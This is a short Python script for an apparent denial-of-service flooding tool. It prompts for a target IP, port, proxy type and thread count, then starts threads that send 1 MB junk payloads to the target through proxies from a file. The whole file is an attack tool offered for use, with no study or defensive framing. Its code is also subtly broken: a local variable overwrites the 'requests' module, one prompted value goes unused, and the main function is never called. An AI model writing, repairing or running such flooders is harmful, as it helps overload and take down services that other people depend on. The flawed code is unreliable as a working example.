import requests
import os
from colorama import Fore
import platform
import socket
from threading import Thread

def clear():
    if platform.system() == 'Windows':
        os.system("cls")
    else:
        os.system("clear")

def dos():
    clear()
    print("Cern@admin-[$]> Enter Proxies Type")
    proxytype = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Target IP ")
    ip = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Target Port ")
    port = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Number of Threads ")
    threads = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Number of Requests ")
    requests = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    print("Cern@admin-[$]> Enter Stress Length")
    length = input(f"{Fore.CYAN}Cern{Fore.WHITE}@{Fore.MAGENTA}User-{Fore.CYAN}[{Fore.WHITE}${Fore.CYAN}]{Fore.WHITE}#")
    def singlerequest():
            with open("proxy.txt", "r") as file:
                proxy = file.read().strip()
                proxies = {
                'http': f'{proxytype}://{proxy}',
                'https': f'{proxytype}://{proxy}'
            }
            for _ in range(int(length)):
                try:
                    payload = 'A' * 1048576  
                    requests.get(f"http://{ip}:{port}",data=payload, proxies=proxies, timeout=6)
                    print(f"Cern@admin-[$]> Sent request to {ip} on port {port}")
                except:
                    print(f"Cern@admin-[$]> Failed to send request to {ip} on port {port}")
    threads_list = []
    for _ in range(int(threads)):
        t = Thread(target=singlerequest)
        threads_list.append(t)
        t.start()


